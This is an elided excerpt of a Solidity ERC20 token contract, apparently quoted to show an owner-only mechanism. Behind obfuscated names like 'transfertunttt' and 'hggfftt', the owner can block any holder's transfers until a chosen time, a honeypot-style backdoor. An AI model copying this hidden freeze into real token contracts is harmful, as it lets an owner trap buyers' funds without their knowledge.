...
contract pda is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transfertunttts;
    ...
    function setTransfertunttt(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set hggfftt for the zero address");
        _transfertunttts[account] = time;
    }

    // Removes transfer hggfftts for a specific account.
    function removeTransfertunttt(address account) public onlyOwner {
        require(account != address(0), "Cannot remove hggfftt for the zero address");
        delete _transfertunttts[account];
    }
    ...
    function gethggffttTime(address account) public view returns (uint256) {
        ...
        return _transfertunttts[account];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(block.timestamp >= _transfertunttts[_msgSender()], "Transfer is currently restricted for this address");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        require(block.timestamp >= _transfertunttts[sender], "Transfer is currently restricted for this address");
